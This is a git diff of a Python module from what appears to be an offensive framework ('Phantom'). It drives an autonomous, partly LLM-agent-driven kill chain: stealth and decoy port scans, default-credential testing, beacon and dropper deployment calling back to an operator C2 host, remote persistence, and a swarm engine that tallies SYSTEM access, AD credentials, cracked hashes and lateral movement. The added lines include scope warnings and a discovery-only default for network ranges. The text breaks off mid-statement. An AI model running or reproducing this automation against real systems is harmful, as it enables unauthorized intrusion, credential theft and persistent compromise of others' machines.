@@ -5,643 +5,24 @@ Completa kill chain autonoma: enumeration → exploit → post-exploitation.
 
 import os
 import re
-import json
 import time
 import ipaddress
 import threading
-from datetime import datetime
 from typing import Callable, Optional, List
 
 from rich.console import Console
 from phantom.core.session import session, KB_STATUS_DEFAULT
 from phantom.core.session_bridge import (merge_agent_into_session,
                                          seed_findings_from_session)
-from phantom.core.executor import run_commands, run_command
 from phantom.utils.notifier import notifier
 from phantom.utils.network import get_lhost
 
 console = Console()
 
 
-# =============================================================================
-# 1. TARGET CLASSIFICATION
-# =============================================================================
-
-def _classify_target(target: str) -> str:
-    """Determina se il target è IP, dominio, email, username o URL."""
-    if target.startswith(("http://", "https://")):
-        return "url"
-    try:
-        ipaddress.ip_address(target)
-        return "ip"
-    except ValueError:
-        pass
-    if "@" in target:
-        parts = target.split("@")
-        if len(parts) == 2 and "." in parts[1]:
-            return "email"
-        return "username"
-    if "_" in target or target.startswith("@"):
-        return "username"
-    if "." in target:
-        return "domain"
-    return "username"
-
-
-# =============================================================================
-# 2. AUTO EXECUTORS (phase executors for the sequence engine)
-# =============================================================================
-
-def _auto_classify() -> bool:
-    """Classifica il target e inizializza KB."""
-    target = session.target
-    if not target:
-        notifier.error("Nessun target impostato.")
-        return False
-
-    kb = session.knowledge_base
-    kb["target"] = target
-    kb["target_type"] = _classify_target(target)
-    kb["started_at"] = datetime.now().isoformat()
-    kb["status"]["classified"] = True
-
-    notifier.info(f"Target classificato: {target} -> {kb['target_type'].upper()}")
-    return True
-
-
-_AUTO_SCAN_COMMANDS = {
-    "ip": {
-        "default": [
-            "sudo nmap -sV -sC -p- --min-rate 3000 -T4 {target}",
-            "sudo nmap -sV -sC -p- -oX {xml} {target}",
-        ],
-        "stealth": [
-            "sudo nmap -sS -f --mtu 24 -sV -p- -oX {xml} {target}",
-            "sudo nmap -sS -D RND:5 {target}",
-        ],
-    },
-    "domain": {
-        "default": [
-            "sudo nmap -sV -sC -p- --min-rate 3000 -T4 {target}",
-            "sudo nmap -sV -sC -p- -oX {xml} {target}",
-        ],
-        "stealth": [
-            "sudo nmap -sS -f --mtu 24 -sV -p- -oX {xml} {target}",
-        ],
-    },
-    "url": {
-        "default": [
-            "sudo nmap -sV -sC -p- --min-rate 3000 -T4 {target_host}",
-        ],
-        "stealth": [
-            "sudo nmap -sS -f --mtu 24 -sV -p- {target_host}",
-        ],
-    },
-}
-
-def _auto_scan() -> bool:
-    """Esegue scansione automatica basata sul tipo di target."""
-    target = session.target
-    kb = session.knowledge_base
-    is_stealth = kb.get("stealth", True)
-
-    from phantom.utils.paths import scan_xml_path, sessions_dir
-    os.makedirs(sessions_dir(), exist_ok=True)
-    xml_path = scan_xml_path(target)
-
-    ttype = kb["target_type"]
-    cmd_set = _AUTO_SCAN_COMMANDS.get(ttype, _AUTO_SCAN_COMMANDS["ip"])
-    mode = "stealth" if is_stealth else "default"
-    commands = cmd_set.get(mode, cmd_set["default"])
-
-    # Formatta con target e xml path
-    formatted = []
-    for cmd in commands:
-        host = target
-        if ttype == "url":
-            from urllib.parse import urlparse
-            parsed = urlparse(target)
-            host = parsed.hostname or target
-        fmt_cmd = cmd.replace("{target}", target).replace("{xml}", xml_path).replace("{target_host}", host)
-        formatted.append(fmt_cmd)
-
-    notifier.info(f"Esecuzione di {len(formatted)} comandi di scan...")
-    results = run_commands(formatted, target)
-    kb["last_output"]["scan"] = results
-
-    # Parsing risultati: estrae porte aperte
-    services = []
-    for output in results.values():
-        matches = re.findall(r"(\d+)/(tcp|udp)\s+open\s+([\w\-\.]+)\s*(.*)", output)
-        for port, proto, svc, ver in matches:
-            if not any(s["port"] == int(port) for s in services):
-                services.append({
-                    "port": int(port),
-                    "protocol": proto,
-                    "service": svc,
-                    "version": ver.strip(),
-                })
-
-    kb["services"] = services
-    kb["status"]["scan_done"] = True
-    session.add_result("scan", results)
-    session.add_result("service_summary", services)
-    notifier.info(f"Trovati {len(services)} servizi attivi")
-    return True
-
-
-def _auto_os_detect() -> bool:
-    """Prova a determinare l'OS dalle risultanze di scansione."""
-    target = session.target
-    from phantom.utils.paths import scan_xml_path
-    xml_path = scan_xml_path(target)
-
-    if os.path.exists(xml_path):
-        from phantom.utils.rce_deployer import parse_scan_xml
-        _, os_info, _ = parse_scan_xml(target)
-        if os_info:
-            session.knowledge_base["os_info"] = os_info
-            session.knowledge_base["status"]["os_detected"] = True
-            notifier.info(f"OS rilevato: {os_info.get('name')} ({os_info.get('accuracy')}%)")
-            return True
-
-    # Fallback: nmap -O
-    cmd = f"sudo nmap -O {target}"
-    output = run_command(cmd, target)
-    match = re.search(r"OS details: (.*)", output, re.IGNORECASE)
-    if match:
-        os_name = match.group(1).strip()
-        session.knowledge_base["os_info"] = {"name": os_name, "accuracy": 90}
-        session.knowledge_base["status"]["os_detected"] = True
-        notifier.info(f"OS rilevato (fallback): {os_name}")
-        return True
-
-    session.knowledge_base["status"]["os_detected"] = True
-    notifier.warn("OS non rilevabile automaticamente")
-    return True
-
-
-_AUTO_OSINT_COMMANDS = {
-    "domain": [
-        "whois {target}",
-        "dig {target} ANY +short",
-        "dig {target} MX +short",
-        "dig {target} TXT +short",
-    ],
-    "ip": [
-        "whois {target}",
-    ],
-}
-
-def _auto_osint() -> bool:
-    """Esecuzione OSINT automatica."""
-    target = session.target
-    kb = session.knowledge_base
-    ttype = kb["target_type"]
-
-    commands = []
-    if ttype in _AUTO_OSINT_COMMANDS:
-        commands = [c.replace("{target}", target) for c in _AUTO_OSINT_COMMANDS[ttype]]
-
-    # API lookups: crt.sh per domini
-    if ttype == "domain":
-        from phantom.utils.api import crtsh_lookup
-        subdomains = crtsh_lookup(target)
-        if subdomains:
-            kb["subdomains_found"] = subdomains
-            notifier.info(f"crt.sh: {len(subdomains)} subdomini trovati")
-
-    # Shodan / InternetDB per IP
-    if ttype == "ip":
-        from phantom.utils.api import shodan_lookup
-        shodan_data = shodan_lookup(target)
-        if shodan_data:
-            ports = shodan_data.get("ports", [])
-            if ports:
-                notifier.info(f"Shodan: {len(ports)} porte aperte note")
-
-    results = run_commands(commands, target) if commands else {}
-    kb["last_output"]["osint"] = results
-    existing = session.get_result("osint") or {}
-    existing.update(results)
-    session.add_result("osint", existing)
-    kb["status"]["osint_done"] = True
-    return True
-
-
-def _auto_social_recon() -> bool:
-    """Ricerca social per username."""
-    from phantom.core.executor import run_command
-    username = session.target.lstrip("@")
-    notifier.status(f"Ricerca social per username: {username}...")
-    cmd = f"sherlock {username} --timeout 5 --print-found"
-    output = run_command(cmd, session.target)
-    links = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', output)
-    if links:
-        kb = session.knowledge_base
-        kb["social_profiles"] = links
-        notifier.success(f"Trovati {len(links)} profili social")
-    else:
-        notifier.info("Nessun profilo social trovato")
-    kb = session.knowledge_base
-    kb["status"]["social_recon_done"] = True
-    return True
-
-
-def _auto_breach_check() -> bool:
-    """Breach lookup per email/username (HIBP v3 con API key).
-
-    Con PHANTOM_HIBP_API_KEY usa l'endpoint breachedaccount (reale, con i
-    nomi dei breach e le date); senza chiave segnala chiaramente che la
-    fonte non è configurata invece di produrre un falso negativo.
-    """
-    target = session.target
-    kb = session.knowledge_base
-    from phantom.utils import config as cfg
-    api_key = str(cfg.get("breach.hibp_api_key", "",
-                          env="PHANTOM_HIBP_API_KEY"))
-    if not api_key:
-        notifier.warn("Breach check saltato: PHANTOM_HIBP_API_KEY non configurato "
-                      "(settabile in .env).")
-        kb["status"]["breach_check_done"] = True
-        return True
-    try:
-        import requests
-        resp = requests.get(
-            f"https://haveibeenpwned.com/api/v3/breachedaccount/{target}",
-            headers={"hibp-api-key": api_key, "User-Agent": "Phantom"},
-            params={"truncateResponse": "false"},
-            timeout=10,
-        )
-        if resp.status_code == 200:
-            for br in resp.json():
-                kb["breaches_found"].append({
-                    "email": target,
-                    "breach": br.get("Name", "?"),
-                    "date": br.get("BreachDate", ""),
-                    "source": "hibp",
-                })
-            notifier.warn(f"Email compromessa in {len(kb['breaches_found'])} data breach!")
-        elif resp.status_code == 404:
-            notifier.info("Nessun breach trovato per il target.")
-    except Exception as e:
-        notifier.warn(f"Breach check fallito: {e}")
-    kb["status"]["breach_check_done"] = True
-    return True
-
-
-_AUTO_WEB_COMMANDS = {
-    "default": [
-        "whatweb {url} --aggression 1",
-        "wafw00f {url}",
-    ],
-    "deep": [
-        "nuclei -u {url} -severity critical,high -silent",
-        "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -k -q 2>/dev/null",
-    ],
-}
-
-def _target_url(target: str) -> str:
-    """Normalize the web base URL without doubling the scheme."""
-    if target.startswith(("http://", "https://")):
-        return target
-    return f"http://{target}"
-
-def _auto_web_recon() -> bool:
-    """Web reconnaissance automatica."""
-    target = session.target
-    kb = session.knowledge_base
-
-    # Determina se ci sono servizi web
-    services = kb.get("services", [])
-    has_web = any(s["service"] in ("http", "https", "http-proxy") or s["port"] in ("80", "443", "8080", "8443") for s in services)
-    if not has_web:
-        notifier.info("Nessun servizio web rilevato, skip web recon")
-        kb["status"]["web_recon_done"] = True
-        return True
-
-    commands = [c.replace("{url}", _target_url(target)) for c in _AUTO_WEB_COMMANDS["default"]]
-    if kb.get("aggressive", False):
-        commands += [c.replace("{url}", _target_url(target)) for c in _AUTO_WEB_COMMANDS["deep"]]
-
-    results = run_commands(commands, target)
-    kb["last_output"]["web"] = results
-    existing = session.get_result("web") or {}
-    existing.update(results)
-    session.add_result("web", existing)
-    kb["status"]["web_recon_done"] = True
-
-    # Estrai endpoint web
-    if kb.get("aggressive", False):
-        endpoints = []
-        for output in results.values():
-            urls = re.findall(r'(?m)^\d{3}\s+.*?(http\S+)', output)
-            endpoints.extend(urls)
-        kb["web_endpoints"] = list(set(endpoints))
-
-    return True
-
-
-def _auto_cve_correlate() -> bool:
-    """Correlazione CVE automatica dai servizi trovati."""
-    from phantom.modules.exploit import ExploitModule, compute_exploitability_score
-    from phantom.utils.api import nvd_lookup, exploitdb_lookup, github_poc_lookup
-    from phantom.utils.parser import ServiceInfo
-
-    kb = session.knowledge_base
-    services = kb.get("services", [])
-    if not services:
-        notifier.warn("Nessun servizio da correlare")
-        kb["status"]["cve_correlate_done"] = True
-        return True
-
-    ranked = []
-    for svc in services:
-        search_term = svc.get("product") or svc.get("service", "")
-        version = svc.get("version", "")
-        if not search_term or not version:
-            continue
-
-        try:
-            cves = nvd_lookup(search_term, version)
-        except Exception:
-            cves = []
-
-        for cve in cves:
-            cve_id = cve.get("id", "")
-            if not cve_id:
-                continue
-            has_exploit = exploitdb_lookup(cve_id)
-            has_msf = bool(has_exploit)  # semplificato
-            has_poc = github_poc_lookup(cve_id)
-            score = compute_exploitability_score(cve, has_msf, has_poc)
-
-            ranked.append({
-                "service": {
-                    "ip": session.target,
-                    "port": svc.get("port", 0),
-                    "protocol": svc.get("protocol", "tcp"),
-                    "state": "open",
-                    "service": svc.get("service", ""),
-                    "product": svc.get("product", ""),
-                    "version": version,
-                },
-                "cve": cve,
-                "score": score,
-                "has_msf": has_msf,
-                "has_poc": has_poc,
-            })
-
-    ranked.sort(key=lambda x: x["score"], reverse=True)
-    kb["cves"] = ranked[:20]
-    session.add_result("exploit", {"ranked": ranked[:20]})
-    kb["status"]["cve_correlate_done"] = True
-
-    if ranked:
-        notifier.success(f"CVE correlation: {len(ranked)} vulnerabilità trovate")
-        for entry in ranked[:5]:
-            c = entry["cve"]
-            notifier.info(f"  {c.get('id')} — score {entry['score']}/100")
-    else:
-        notifier.info("Nessuna CVE trovata per i servizi correnti")
-
-    return True
-
-
-def _auto_test_creds() -> bool:
-    """Test credenziali di default sui servizi trovati."""
-    from phantom.utils.rce_deployer import detect_rce_vectors, auto_try_credentials, auto_select_vector
-
-    kb = session.knowledge_base
-    services = kb.get("services", [])
-    os_info = kb.get("os_info", {})
-    found_creds = kb.get("creds_found", [])
-
-    if not services:
-        kb["status"]["default_creds_tested"] = True
-        return True
-
-    vectors = detect_rce_vectors(services)
-    if not vectors:
-        kb["status"]["default_creds_tested"] = True
-        return True
-
-    # Prova credenziali su ogni vettore
-    new_creds = []
-    for vec in vectors:
-        method = vec["method"]
-        port = vec["port"]
-        cred = auto_try_credentials(method, session.target, port, nmap_creds=found_creds)
-        if cred:
-            cred["method"] = method
-            cred["port"] = port
-            new_creds.append(cred)
-
-    if new_creds:
-        kb["creds_found"] = list(set(
-            tuple(sorted(c.items())) for c in (found_creds + new_creds)
-        ))
-        kb["creds_found"] = [dict(t) for t in kb["creds_found"]]
-        notifier.success(f"Trovate {len(new_creds)} credenziali valide")
-
-    kb["status"]["default_creds_tested"] = True
-    return True
-
-
-def _auto_deploy_beacon() -> bool:
-    """Deploy beacon automatico."""
-    from phantom.utils.rce_deployer import auto_deploy_beacon as _auto_deploy
-
-    kb = session.knowledge_base
-    target = session.target
-    aggressive = kb.get("aggressive", False)
-
-    # Determina piattaforma dall'OS
-    os_info = kb.get("os_info", {})
-    os_name = os_info.get("name", "").lower() if os_info else ""
-    if any(k in os_name for k in ("windows", "microsoft", "win")):
-        platform = "windows"
-    elif any(k in os_name for k in ("linux", "ubuntu", "debian", "centos")):
-        platform = "linux"
-    else:
-        # Default dal tipo di servizi
-        services = kb.get("services", [])
-        svc_names = [s.get("service", "") for s in services]
-        if any("msrpc" in s or "smb" in s or "netbios" in s for s in svc_names):
-            platform = "windows"
-        else:
-            platform = "linux"
-
-    # Prepara C2 (use_ssl coerente: il listener legacy resta HTTP di default;
-    # il beacon riceve use_https anche via argv dai dropper POSIX)
-    lhost = get_lhost()
-    lport = session.lport or 443
-    use_ssl = True  # secure-by-default (mTLS auto-generated)
-
-    from phantom.utils.builder import compile_beacon, generate_dropper
-    import phantom
-
-    pkg_root = os.path.dirname(phantom.__file__)
-    arch = "x64"
-
-    notifier.status(f"Compilazione beacon per {platform}...")
-    try:
-        beacon_path = compile_beacon(platform, pkg_root, force_rebuild=True, arch=arch,
-                                     host=lhost, port=lport, use_ssl=use_ssl)
-        if not beacon_path:
-            notifier.error("Compilazione beacon fallita")
-            kb["status"]["rce_attempted"] = True
-            return False
-    except Exception as e:
-        notifier.error(f"Compilazione beacon fallita: {e}")
-        kb["status"]["rce_attempted"] = True
-        return False
-
-    dropper = generate_dropper(platform, lhost, lport, arch=arch, use_ssl=use_ssl)
-    if not dropper:
-        notifier.error("Generazione dropper fallita")
-        kb["status"]["rce_attempted"] = True
-        return False
-
-    success = _auto_deploy(target, dropper, aggressive=aggressive)
-    kb["beacon_deployed"] = success
-    kb["status"]["rce_attempted"] = True
-
-    if success:
-        notifier.success("Beacon deployato con successo!")
-    else:
-        notifier.warn("Deploy beacon fallito su tutti i vettori")
-
-    return success
-
-
-def _auto_persistence() -> bool:
-    """Imposta persistenza automatica se beacon attivo.
-
-    The persistence is queued to the REMOTE beacon through the C2 task
-    channel (the beacon's own `persist` built-in) — NEVER executed on the
-    operator's machine (registry/cron edits here would be self-damage).
-    """
-    kb = session.knowledge_base
-    if not kb.get("beacon_deployed", False):
-        notifier.warn("Nessun beacon attivo, skip persistenza")
-        kb["status"]["persistence_set"] = True
-        return True
-
-    from phantom.core.c2_server import c2_state
-    os_info = kb.get("os_info", {})
-    os_name = os_info.get("name", "").lower() if os_info else ""
-    method = "runkey" if any(k in os_name for k in ("windows", "microsoft", "win")) else "systemd"
-
-    queued = False
-    for beacon_id, info in c2_state.get_beacons().items():
-        if info.get("ip") != session.target:
-            continue
-        task_id = c2_state.queue_task(beacon_id, f"persist {method}")
-        notifier.info(f"Persistenza ({method}) accodata al beacon {beacon_id} (Task: {task_id})")
-        queued = True
-
-    if not queued:
-        notifier.warn("Nessun beacon registrato per il target: persistenza non accodata")
-        kb["status"]["persistence_set"] = True
-        return False
-
-    kb["persistence_set"] = True
-    kb["status"]["persistence_set"] = True
-    notifier.success("Persistenza configurata sul beacon remoto")
-    return True
-
-
-# =============================================================================
-# 3. SEQUENCE ENGINE (phase executors — decision logic lives in workflow.py)
-# =============================================================================
-
-_STEP_MAP = {
-    "classify": _auto_classify,
-    "scan": _auto_scan,
-    "os_detect": _auto_os_detect,
-    "osint": _auto_osint,
-    "web_recon": _auto_web_recon,
-    "social_recon": _auto_social_recon,
-    "breach_check": _auto_breach_check,
-    "cve_correlate": _auto_cve_correlate,
-    "test_creds": _auto_test_creds,
-    "deploy_beacon": _auto_deploy_beacon,
-    "persistence": _auto_persistence,
-}
-
-# =============================================================================
-# 4. REPORT
-# =============================================================================
-
-def _auto_generate_report():
-    """Genera report finale dell'auto-mode."""
-    from phantom.modules.report import ReportModule
-
-    kb = session.knowledge_base
-    session.add_note(f"AUTO-MODE EXECUTION SUMMARY")
-    session.add_note(f"  Target: {kb.get('target')} ({kb.get('target_type')})")
-    session.add_note(f"  Stealth: {kb.get('stealth')} | Aggressive: {kb.get('aggressive')}")
-    session.add_note(f"  Started: {kb.get('started_at')}")
-    session.add_note(f"  Status: {json.dumps(kb.get('status'), indent=2)}")
-
-    if kb.get("services"):
-        session.add_note(f"  Services found: {len(kb['services'])}")
-    if kb.get("cves"):
-        session.add_note(f"  CVEs correlated: {len(kb['cves'])}")
-    if kb.get("beacon_deployed"):
-        session.add_note(f"  Beacon deployed: YES")
-    if kb.get("persistence_set"):
-        session.add_note(f"  Persistence: SET")
-    if kb.get("errors"):
-        session.add_note(f"  Errors: {len(kb['errors'])}")
-
-    name_base = re.sub(r"[^A-Za-z0-9_\-.]", "_", kb.get("target", "unknown"))
-    name = f"auto_{name_base}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-    session.save(name)
-
-    # Report markdown professionale
-    session.export_markdown(f"{name}.md")
-    notifier.success(f"Report auto-mode salvato: {name}.md")
-    return name# =============================================================================
-# 5. SEQUENCE ENGINE (explicit scripted mode — merged workflow+automode)
-# =============================================================================
-
-def run_sequence_mode(target: str = "", stealth: bool = True,
-                      aggressive: bool = False) -> None:
-    """Deterministic kill-chain sequence (the merged workflow+automode
-    engine) against ONE target.
-
-    `auto` now delegates to the planner agent by default; use this explicit
-    path when the operator wants the predictable, phase-ordered run with
-    enterprise scoring (calibration / ATT&CK / threat intel / risk / history
-    feedback recorded through WorkflowManager).
-    """
-    from phantom.core.workflow import workflow_manager
-    if target:
-        session.target = target
-    if not session.target:
-        notifier.error("Nessun target specificato.")
-        return
-
-    kb = session.knowledge_base
-    kb["target"] = session.target
-    kb["stealth"] = stealth
-    kb["aggressive"] = aggressive
-    kb["target_type"] = _classify_target(session.target)
-
-    for phase_name, executor_fn in _STEP_MAP.items():
-        workflow_manager.register_executor(phase_name, executor_fn)
-
-    workflow_manager.run_workflow(session.target, stealth=stealth,
-                                  aggressive=aggressive)
-    report_name = _auto_generate_report()
-    notifier.info(f"Report: {report_name}")
-
-
-# =============================================================================
-# 6. AGENT ROUTING (auto -> planner agent)
-# =============================================================================
+# -----------------------------------------------------------------------------
+# Agent routing (auto -> planner agent -> swarm tasks)
+# -----------------------------------------------------------------------------
 
 _MAX_CIDR_HOSTS = 256
 
@@ -1011,6 +392,169 @@ def _fmt_elapsed(seconds: float) -> str:
     return f"{s}s"
 
 
+# goal -> swarm chain template. Goals without a swarm chain (cleanup…)
+# fall back to the single-agent path with a notice (honest, not silent).
+_GOAL_CHAIN = {
+    "footprint": "footprint", "identity": "identity", "creds": "creds",
+    "web": "web",
+    "beacon": "full", "deliver": "full", "complete_kill_chain": "full",
+    "deep": "deep", "post_exploit": "deep", "ad": "deep",
+    "crack": "deep", "lateral": "deep",
+}
+
+
+def _stream_swarm_event(kind: str, data: dict, verbose: bool = False,
+                        on_event=None) -> None:
+    """Swarm events onto the operator stream (mirrors the agent event
+    vocabulary where it overlaps so consoles need no new renderer)."""
+    if kind == "task_target":
+        if data.get("ok"):
+            notifier.success(
+                f"Swarm {data.get('task')} @ {data.get('target')}: "
+                f"+{data.get('staged', 0)} finding(s) committed")
+        else:
+            notifier.warn(
+                f"Swarm {data.get('task')} @ {data.get('target')}: "
+                f"no provides ({data.get('staged', 0)} staged)")
+    elif kind == "failed":
+        notifier.warn(f"Swarm {data.get('task')}: {data.get('output', '')[:120]}")
+    elif kind == "llm_request":
+        notifier.warn(f"Swarm chiede LLM: {data.get('reason', '')[:140]} "
+                      f"(approva: POST /api/automode/llm {{\"allow\": true}})")
+    elif kind == "llm_consult":
+        notifier.info(f"Swarm×LLM ({data.get('state', '')}): "
+                      f"{data.get('count', 0)} suggerimenti validati")
+    if on_event is not None:
+        try:
+            on_event(kind, data)
+        except Exception:
+            pass
+
+
+def _run_swarm_operation(targets, goal, profile, aggressive, speed,
+                         agents, verbose=False, on_event=None,
+                         llm: bool = False, budget: int = 10):
+    """Swarm engine for run_auto_mode: fact-driven tasks over a shared
+    board, then merge into the manual session. Returns
+    (result, summary, merged) where result speaks the legacy keys the
+    reporting tail below already understands."""
+    from phantom.automation.swarm import run_swarm
+    from phantom.automation.swarm.llm import LLMApproval
+    from phantom.core.session_bridge import merge_board_into_session
+
+    chain = _GOAL_CHAIN.get(goal, "")
+    if not chain:
+        return None
+    approval = LLMApproval()
+    if llm:
+        approval.approve_session()
+    # core -> swarm: manual recon seeds the board so workers build on it.
+    # PER TARGET (a seed read for targets[0] applied to every target
+    # would teach each worker another machine's truth).
+    seed = {}
+    for t in targets:
+        try:
+            facts = seed_findings_from_session(t)
+            if facts:
+                seed[t] = facts
+        except Exception:
+            continue
+    summary = run_swarm(
+        targets, chain=chain, profile=profile, aggressive=aggressive,
+        max_agents=agents or 10, budget=budget, llm_approval=approval,
+        seed_facts=seed or None, scope_list=list(session.scope or []),
+        on_event=lambda k, d: _stream_swarm_event(k, d, verbose, on_event))
+    board = summary.get("board_ref")
+    merged = merge_board_into_session(board) if board is not None else {}
+    n_beacon = sum(board.count(t, "beacon") for t in targets) \
+        if board is not None else 0
+    n_persist = sum(board.count(t, "persistence") for t in targets) \
+        if board is not None else 0
+    n_sys = sum(board.count(t, "system_privilege") for t in targets) \
+        if board is not None else 0
+    n_ad = sum(board.count(t, "ad_creds") for t in targets) \
+        if board is not None else 0
+    n_cracked = sum(board.count(t, "cracked") for t in targets) \
+        if board is not None else 0
+    n_lateral = sum(board.count(t, "pivot") for t in targets) \
+        if board is not None else 0
+    n_creds = sum(board.count(t, "creds") for t in targets) \
+        if board is not None else 0
+    n_victims = sum(board.count(t, "victim_ip") for t in targets) \
+        if board is not None else 0
+    result = {
+        "beacon_established": n_beacon > 0, "beacon_id": "",
+        "persistence_installed": n_persist > 0,
+        "system_privilege": n_sys > 0, "ad_creds": n_ad,
+        "cracked_hashes": n_cracked, "lateral_movements": n_lateral,
+        "actions_taken": summary.get("actions_taken", 0),
+        "creds_found": n_creds, "victim_ips": n_victims,
+        "hypotheses": 0, "hypotheses_confirmed": 0,
+        "stages": {"deliver": n_beacon > 0,
+                   "post_exploit": n_sys > 0,
+                   "ad": n_ad > 0, "crack": n_cracked > 0,
+                   "lateral": n_lateral > 0},
+    }
+    return result, summary, merged
+
+
+def _write_swarm_summary(summary: dict, out_root: str, target: str) -> dict:
+    """Persist the swarm operation summary (board_ref excluded: live
+    objects, not JSON). Returns {"summary": path} like the report writer."""
+    import json as _json
+    clean = {k: v for k, v in (summary or {}).items() if k != "board_ref"}
+    os.makedirs(out_root, exist_ok=True)
+    path = os.path.join(out_root, "swarm_summary.json")
+    try:
+        with open(path, "w", encoding="utf-8") as fh:
+            _json.dump(clean, fh, indent=2, default=str)
+    except OSError as exc:
+        notifier.warn(f"Swarm summary non salvato: {exc}")
+        return {}
+    return {"summary": path}
+
+
+def _print_swarm_tail(result: dict, summary: dict, out_root: str,
+                      started_wall: float, goal: str, on_event,
+                      handoff_c2: bool) -> None:
+    """Shared reporting tail for swarm runs (single + campaign): stage
+    ladder, totals, merge note. No checkpoint file exists for swarm —
+    re-running merges the committed session seed, so downstream tasks
+    release at once instead of rediscovering."""
+    elapsed = _fmt_elapsed(time.time() - started_wall)
+    tasks = summary.get("tasks", []) if summary else []
+    done = sum(1 for t in tasks if t.get("status") == "done")
+    if goal == "deep":
+        st = result.get("stages") or {}
+        ladder = " ".join(
+            f"{k}={'✔' if st.get(k) else '—'}" for k in
+            ("deliver", "post_exploit", "ad", "crack", "lateral"))
+        notifier.success(
+            f"Swarm deep completato (⏱ {elapsed}): "
+            f"{done}/{len(tasks)} task, beacon={result.get('beacon_established')}, "
+            f"persistenza={result.get('persistence_installed')}, "
+            f"system/root={result.get('system_privilege')}, "
+            f"AD creds={result.get('ad_creds')}, "
+            f"cracked={result.get('cracked_hashes')}, "
+            f"lateral={result.get('lateral_movements')}, "
+            f"azioni={result.get('actions_taken')}")
+        notifier.info(f"Stage ladder: {ladder}")
+    else:
+        notifier.success(
+            f"Swarm {goal} completo (⏱ {elapsed}): {done}/{len(tasks)} task, "
+            f"beacon={result.get('beacon_established')}, "
+            f"persistenza={result.get('persistence_installed')}, "
+            f"creds={result.get('creds_found')}, "
+            f"azioni={result.get('actions_taken')}")
+    notifier.info(f"⏱ Tempo totale engagement: {elapsed}.")
+    if result.get("beacon_established"):
+        notifier.info("Nessun handoff automatico dallo swarm: apri 'c2' -> "
+                      "'beacons' per prendere in carico i callback.")
+    else:
+        notifier.warn("Nessun beacon stabilito: niente handoff. "
+                      "Usa 'c2' -> 'beacons' per monitorare callback")
+
+
 def _probe_bind(host: str, port: int) -> bool:
     """Can this box bind (host, port) right now? A throwaway socket answers
     without touching the real C2 server instance (no half-dead state)."""
@@ -1082,10 +626,12 @@ def run_auto_mode(targets=None, aggressive: bool = False, stealth: bool = False,
                   beta: bool = False,
                   resume: str = "",
                   stop_event: Optional[threading.Event] = None,
-                  reason_profile: str = "",
-                  cell_loop: bool = False,
-                  cell_stages: Optional[List[str]] = None,
-                  only_markdown: bool = False) -> None:
+                   reason_profile: str = "",
+                   cell_loop: bool = False,
+                   cell_stages: Optional[List[str]] = None,
+                   only_markdown: bool = False,
+                   engine: str = "agent",
+                   force_network: bool = False) -> None:
     """Autonomous kill chain (planner agent) — the `auto` entry point.
 
     Classifies each target (ip/domain/url/email/username/phone) and drives
@@ -1113,6 +659,15 @@ def run_auto_mode(targets=None, aggressive: bool = False, stealth: bool = False,
     can be handed to another operator with `export-session` (.pm).
 
     `stealth` and `aggressive` are mutually exclusive (validated by caller).
+
+    engine "agent" (default) runs the single-agent planner chain;
+    engine "swarm" runs fact-driven swarm tasks over a shared board
+    (orchestrator + worker agents, merged back into the session).
+
+    force_network: a CIDR/range input engages ONLY host discovery (-sn
+    + ranking) by default — the range is NEVER sprayed with full chains
+    unless the operator passes force_network=True (CLI --force-network
+    with an explicit disclaimer + confirm). A range is not intent.
     """
     raw = list(targets or [])
     if isinstance(targets, str):
@@ -1166,6 +721,30 @@ def run_auto_mode(targets=None, aggressive: bool = False, stealth: bool = False,
                 "Nessun host esposto rilevato o nmap assente: espansione "
                 "CIDR classica (host a caso nella rete)")
 
+    # RANGE POLICY: a CIDR/range token authorizes discovery (-sn +
+    # ranking, already done above), never an assault. Engaging N hosts
+    # with full chains needs explicit operator intent per host, or the
+    # force flag with its disclaimer. A range is not intent. Dry-run
+    # (--plan) always passes: it executes nothing.
+    if networks and not force_network and not plan:
+        if len(resolved) > 1 or any("/" in t for t in raw):
+            notifier.info("Network scope: discovery-only di default "
+                          "(host vivi + ranking, nessun engagement).")
+            for t in resolved[:20]:
+                console.print(f"  [cyan]{t}[/]")
+            if len(resolved) > 20:
+                console.print(f"  [dim]... +{len(resolved) - 20} altri "
+                              f"(vedi network map)[/]")
+            notifier.info("Per ingaggiare: riesegui con host espliciti "
+                          "oppure --force-network (full engagement, loud).")
+            return
+    if networks and force_network:
+        notifier.warn(
+            f"FORCE-NETWORK attivo: engagement completo su {len(resolved)} "
+            f"host ({', '.join(resolved[:5])}"
+            f"{', ...' if len(resolved) > 5 else ''}). Scansioni, exploit "
+            f"e brute force gireranno su tutta la rete.")
+
     notifier.success("=" * 25 + " PHANTOM AUTO-MODE (agent) " + "=" * 25)
     # auto-profile: a phone-number target (or any mobile-classified
     # target) defaults to the mobile defender model when the operator left
@@ -1183,6 +762,20 @@ def run_auto_mode(targets=None, aggressive: bool = False, stealth: bool = False,
                   f"verbose={verbose} | agents={agents or 'auto'} | "
                   f"llm={'on' if llm else 'off'} | "
                   f"experience={'global' if experience else 'run-only'}")
+    if not scope_list:
+        try:
+            from phantom.automation.guidance.targets import (
+                classify_target, is_identity_target)
+            net_targets = [t for t in resolved
+                           if not is_identity_target(classify_target(t))]
+        except Exception:
+            net_targets = list(resolved)
+        if net_targets:
+            notifier.warn(
+                "NESSUNO SCOPE impostato su target di rete: l'auto-mode "
+                "non rifiuterà nulla da solo. Imposta 'set scope "
+                "<cidr,...>' (o scope_list) prima di run reali — un "
+                "typo nel target o un CIDR largo colpiscono davvero.")
 
     if plan:
         for t in resolved:
@@ -1243,6 +836,29 @@ def run_auto_mode(targets=None, aggressive: bool = False, stealth: bool = False,
             notifier.warn(f"[beta] load fallito: {_exc}")
 
     if len(resolved) == 1:
+        if engine == "swarm" and goal in _GOAL_CHAIN:
+            for _flag, _name in ((resume, "--resume"),
+                                 (experience, "--experience"),
+                                 (evolution, "--evolution")):
+                if _flag:
+                    notifier.warn(
+                        f"{_name} ignorato sullo swarm path "
+                        f"(checkpoint/evolution sono del path agent)")
+            notifier.success("=" * 25 + " PHANTOM AUTO-MODE (swarm) " + "=" * 25)
+            result, summary, _merged = _run_swarm_operation(
+                resolved, goal, profile, aggressive, speed, agents,
+                verbose, on_event, llm)
+            paths = _write_swarm_summary(summary, out_root, resolved[0])
+            if _merged:
+                notifier.info(
+                    "Core sync: " + ", ".join(
+                        f"{k}={v}" for k, v in sorted(_merged.items())) +
